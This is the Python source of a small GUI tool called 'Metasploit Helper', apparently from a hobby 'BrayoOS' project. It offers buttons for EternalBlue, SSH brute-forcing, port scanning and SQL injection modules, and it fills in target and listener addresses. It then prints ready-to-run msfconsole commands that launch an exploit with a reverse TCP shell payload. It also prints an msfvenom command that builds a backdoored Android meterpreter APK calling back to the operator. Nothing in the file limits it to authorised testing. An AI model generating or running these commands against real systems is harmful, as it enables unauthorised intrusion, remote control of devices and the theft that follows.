# BrayoOS — Built by Brayo & AIRA — Kenya 2026
# Copyright (C) 2026 Brayo. GPL-3.0 License

import tkinter as tk
from tkinter import scrolledtext
import subprocess
import threading

BG = "#0D0D0D"
ACCENT = "#00FF41"
TEXT = "#FFFFFF"
DARK = "#1A1A1A"

class MetasploitHelper:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("💀 Metasploit Helper")
        self.root.configure(bg=BG)
        self.root.geometry("800x600")
        self.build_ui()
        self.root.mainloop()

    def build_ui(self):
        tk.Label(self.root, text="💀 Metasploit Helper",
                bg=BG, fg=ACCENT,
                font=("monospace", 16, "bold")).pack(pady=10)

        # Module selector
        mod_frame = tk.LabelFrame(self.root,
                                 text="Common Modules",
                                 bg=BG, fg=ACCENT,
                                 font=("monospace", 10))
        mod_frame.pack(fill=tk.X, padx=10, pady=5)

        modules = [
            ("🌐 EternalBlue", "exploit/windows/smb/ms17_010_eternalblue"),
            ("🔑 SSH Brute", "auxiliary/scanner/ssh/ssh_login"),
            ("📡 Port Scan", "auxiliary/scanner/portscan/tcp"),
            ("🌍 HTTP Scan", "auxiliary/scanner/http/http_version"),
            ("💉 SQL Inject", "auxiliary/scanner/http/sql_injection"),
            ("📱 Android", "exploit/multi/handler"),
        ]

        row, col = 0, 0
        for name, module in modules:
            tk.Button(mod_frame, text=name,
                     bg=DARK, fg=ACCENT,
                     font=("monospace", 9),
                     command=lambda m=module: self.load_module(m),
                     relief=tk.FLAT).grid(
                         row=row, column=col,
                         padx=3, pady=3)
            col += 1
            if col > 2:
                col = 0
                row += 1

        # Command builder
        cmd_frame = tk.LabelFrame(self.root,
                                 text="Command Builder",
                                 bg=BG, fg=ACCENT,
                                 font=("monospace", 10))
        cmd_frame.pack(fill=tk.X, padx=10, pady=5)

        fields = [
            ("RHOSTS:", "192.168.1.1"),
            ("RPORT:", "445"),
            ("LHOST:", "192.168.1.100"),
            ("LPORT:", "4444"),
        ]

        self.fields = {}
        for i, (label, default) in enumerate(fields):
            f = tk.Frame(cmd_frame, bg=BG)
            f.pack(side=tk.LEFT, padx=5)
            tk.Label(f, text=label, bg=BG,
                    fg=TEXT,
                    font=("monospace", 9)).pack()
            e = tk.Entry(f, bg=DARK, fg=ACCENT,
                        font=("monospace", 9),
                        width=15,
                        insertbackground=ACCENT)
            e.insert(0, default)
            e.pack()
            self.fields[label] = e

        tk.Button(cmd_frame, text="📋 Generate",
                 bg=ACCENT, fg=BG,
                 command=self.generate).pack(
                     side=tk.LEFT, padx=10)

        # Output
        self.output = scrolledtext.ScrolledText(
            self.root, bg=DARK, fg=ACCENT,
            font=("monospace", 10))
        self.output.pack(fill=tk.BOTH, expand=True,
                        padx=10, pady=5)

        self.log("💀 Metasploit Helper Ready!")
        self.log("Select a module to get started.")
        self.log("━"*50)

    def log(self, msg):
        self.output.insert(tk.END, msg + "\n")
        self.output.see(tk.END)

    def load_module(self, module):
        self.output.delete(1.0, tk.END)
        self.log(f"📦 Module: {module}")
        self.log("━"*50)
        self.log("msfconsole commands:")
        self.log(f"use {module}")
        self.log("show options")
        self.generate()

    def generate(self):
        rhosts = self.fields["RHOSTS:"].get()
        rport = self.fields["RPORT:"].get()
        lhost = self.fields["LHOST:"].get()
        lport = self.fields["LPORT:"].get()

        self.log("\n📋 Generated Commands:")
        self.log("━"*50)
        self.log(f"set RHOSTS {rhosts}")
        self.log(f"set RPORT {rport}")
        self.log(f"set LHOST {lhost}")
        self.log(f"set LPORT {lport}")
        self.log("set PAYLOAD generic/shell_reverse_tcp")
        self.log("exploit")
        self.log("\n# Or use msfvenom:")
        self.log(
            f"msfvenom -p android/meterpreter/reverse_tcp "
            f"LHOST={lhost} LPORT={lport} "
            f"R > payload.apk")

if __name__ == "__main__":
    MetasploitHelper()
